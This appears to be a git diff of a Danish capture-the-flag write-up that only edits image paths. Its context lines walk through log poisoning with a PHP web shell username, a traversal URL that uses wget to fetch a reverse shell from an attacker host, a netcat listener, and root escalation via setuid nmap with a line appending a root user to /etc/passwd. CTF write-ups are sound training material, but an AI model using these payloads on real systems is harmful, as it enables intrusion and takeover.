@@ -76,7 +76,7 @@ Der er et farligt farligt `php include` parret med `path traversal` se mere her:
 
 Vi kan prøve at inkludere `/var/log/auth.log` for at se om vi kan `forgifte` den log.
 
-![authlog](/assets/auth.log.jpg)
+![authlog](auth.log.jpg)
 
 Yes det virker. Vores næste step er at få noget php kode ind i loggen, som vi kan udnytte.
 
@@ -88,7 +88,7 @@ ssh '<?php echo(system($_GET["a"])); ?>'@gift.hkn
 
 skriver et forkert password, og prøver at inkludere loggen igen med parameter fra payload ovenover.
 
-![logpoison](/assets/logpoison.jpg)
+![logpoison](logpoison.jpg)
 
 ok vi har command execution.
 
@@ -102,7 +102,7 @@ http://gift.hkn:8000/?adminDebug=../../../../../var/log/auth.log&a=wget http://D
 
 herefter kan du trigger din reverse shell ved først at køre `nc -lvnp 1234` på din angriber maskine, og så gå til `gift.hkn/rev.php`
 
-![revshell](/assets/revvy.jpg)
+![revshell](revvy.jpg)
 
 
 ok så er vi på maskinen.
@@ -111,7 +111,7 @@ Her laver du så standard linux privesc enum, jeg plejer at bruge linpeas. https
 
 Herfra finder du så ud af at `nmap` er installeret på maskinen med `setuid` bit på.
 
-![revshell](/assets/setuid.JPG)
+![revshell](setuid.JPG)
 
 Det betyder at vi kan køre nmap som root brugeren. 
 
@@ -126,7 +126,7 @@ https://infinitelogins.com/2021/02/24/linux-privilege-escalation-weak-file-permi
 
 vi vil gerne bruge ovenstående taktik til at skrive en ny bruger, som har root access og som har et password vi kender. Vi kan generere hash for passwordet `a` således:
 
-![revshell](/assets/password.jpg)
+![revshell](password.jpg)
 
 Ok, så kigger vi lige på det angreb de beskriver på gtfobins til read.
 
@@ -150,7 +150,7 @@ TF=$(mktemp) && echo 'local f=io.open("/etc/passwd", "ab"); f:write("\nroot3:OEE
 
 Vi kan køre exploit på remote og prøve at privesc
 
-![revshell](/assets/privesc1.JPG)
+![revshell](privesc1.JPG)
 
 lol fuck, ok vi skal have en upgraderet shell, her er en god guide til at få en bedre shell
 
@@ -169,7 +169,7 @@ Password: a
 cool vi er root og hopper til `/root` og flag!
 
 
-![revshell](/assets/flag.jpg)
+![revshell](flag.jpg)
 
 
 
